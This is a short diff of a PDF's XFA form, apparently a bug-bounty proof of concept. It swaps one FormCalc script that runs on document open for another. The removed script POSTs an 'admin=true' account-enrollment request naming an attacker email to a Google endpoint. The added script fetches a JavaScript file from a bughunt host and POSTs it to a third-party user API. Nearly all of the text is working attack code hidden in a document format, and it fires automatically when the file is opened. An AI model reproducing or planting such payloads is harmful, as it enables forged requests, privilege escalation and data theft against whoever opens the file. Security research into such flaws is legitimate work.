@@ -18,8 +18,8 @@ stream
         <field id="Hello World!">
             <event activity="initialize">
                 <script contentType='application/x-formcalc'>
-                    
-                    POST("https://services.google.com/supplier-enrollment/supplier","account_type=google&email=attacker@attcker.com&admin=true","application/javascript","UTF-8","X-GWT-Permutation: dumb")
+                    var content = GET("https://bughunt1307.herokuapp.com/zync.js")
+                    POST("https://missou1307.zync.io/api/users",content,"application/x-www-form-urlencoded","UTF-8","X-Zync-Header: 1")
                 </script>
             </event>
         </field>
